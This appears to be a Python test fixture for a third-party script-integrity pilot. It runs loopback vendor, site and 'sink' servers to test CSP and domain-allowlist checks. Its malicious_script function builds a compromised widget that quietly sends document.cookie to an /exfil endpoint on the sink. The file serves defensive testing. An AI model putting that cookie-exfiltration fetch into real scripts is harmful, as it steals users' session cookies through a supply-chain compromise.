"""Two real local HTTP servers for the script-integrity pilot: a
"vendor" server (127.0.0.1) serving a third-party script and the
operator's own page that embeds it, and a separate "sink" server
(127.0.0.2) standing in for an attacker-controlled destination a
compromised script could try to reach. Both are bound to loopback
addresses under this machine's own control -- nothing here contacts
any real third party.

Serving two distinct loopback addresses (127.0.0.1 and 127.0.0.2, both
valid on Linux without extra configuration) gives the pilot two
genuinely different hostnames to register and test the domain-allowlist
and prohibited-sink checks against, without needing real DNS or a real
external vendor/attacker domain.
"""
from __future__ import annotations

import http.server
import threading

GOOD_SCRIPT = b"""
document.addEventListener('DOMContentLoaded', function () {
  var b = document.getElementById('checkout-button');
  if (b) { b.disabled = false; }
});
"""

# A benign, reviewed vendor update: different bytes, same behavior. This
# models a legitimate script rotation an operator pre-registers the new
# hash for, not an incident.
BENIGN_UPDATE_SCRIPT = b"""
document.addEventListener('DOMContentLoaded', function () {
  var b = document.getElementById('checkout-button');
  if (b) { b.disabled = false; }
  // v2: cosmetic vendor comment, no behavior change
});
"""


def malicious_script(sink_origin: str) -> bytes:
    """A compromised version of the vendor script: same visible behavior,
    plus a real network call to the attacker-controlled sink origin, the
    way an actual supply-chain compromise exfiltrates data through a
    request the static markup never declares."""
    return (
        "document.addEventListener('DOMContentLoaded', function () {\n"
        "  var b = document.getElementById('checkout-button');\n"
        "  if (b) { b.disabled = false; }\n"
        "  fetch('" + sink_origin + "/exfil?c=' + encodeURIComponent(document.cookie || 'none'),"
        " {mode: 'no-cors'}).catch(function(){});\n"
        "});\n"
    ).encode("utf-8")


PAGE_TEMPLATE = """<!doctype html>
<html><head><meta charset="utf-8"><title>Lab checkout page</title></head>
<body>
  <h1>Lab checkout page</h1>
  <button id="checkout-button" disabled>Checkout</button>
  <script src="{script_url}"></script>
  {extra_script_tag}
</body></html>
"""


class VendorState:
    """Mutable, thread-safe toggle for what the two servers currently
    serve, so the pilot can move through scenarios against one running
    pair of servers rather than restarting them. The operator's own
    site (`site_origin`) and the third-party vendor's script
    (`vendor_origin`) are deliberately served from two different
    loopback addresses, exactly as a real operator site and a real
    third-party CDN are two different origins -- serving them from the
    same origin would make a `script-src 'self'` CSP trivially cover
    the vendor script too, which is not how this containment action
    works for a genuine third party."""

    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.script_body = GOOD_SCRIPT
        self.csp_header: str | None = None
        self.extra_script_tag = ""
        self.vendor_origin = ""   # set once the vendor server's real port is known
        self.site_origin = ""     # set once the site server's real port is known
        self.sink_origin = ""


def make_vendor_handler(state: VendorState):
    """Serves only the third-party script, from its own origin. The
    vendor does not control the operator's own CSP header; it serves
    whatever bytes `state.script_body` currently holds."""

    class VendorHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            with state.lock:
                body_bytes = state.script_body
            if self.path == "/widget.js":
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Content-Length", str(len(body_bytes)))
                self.end_headers()
                self.wfile.write(body_bytes)
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, *args):
            pass

    return VendorHandler


def make_site_handler(state: VendorState):
    """Serves the operator's own page and sets the operator's own CSP
    header -- the header a real operator's server, not the vendor's,
    is responsible for."""

    class SiteHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            with state.lock:
                csp = state.csp_header
                script_url = state.vendor_origin + "/widget.js"
                extra = state.extra_script_tag
            if self.path == "/page.html":
                payload = PAGE_TEMPLATE.format(script_url=script_url, extra_script_tag=extra).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(payload)))
                if csp:
                    self.send_header("Content-Security-Policy", csp)
                self.end_headers()
                self.wfile.write(payload)
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, *args):
            pass

    return SiteHandler


class SinkState:
    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.hits: list[str] = []


def make_sink_handler(state: SinkState):
    class SinkHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            with state.lock:
                state.hits.append(self.path)
            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

        def log_message(self, *args):
            pass

    return SinkHandler


def start_server(host: str, handler_cls) -> http.server.HTTPServer:
    server = http.server.HTTPServer((host, 0), handler_cls)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server
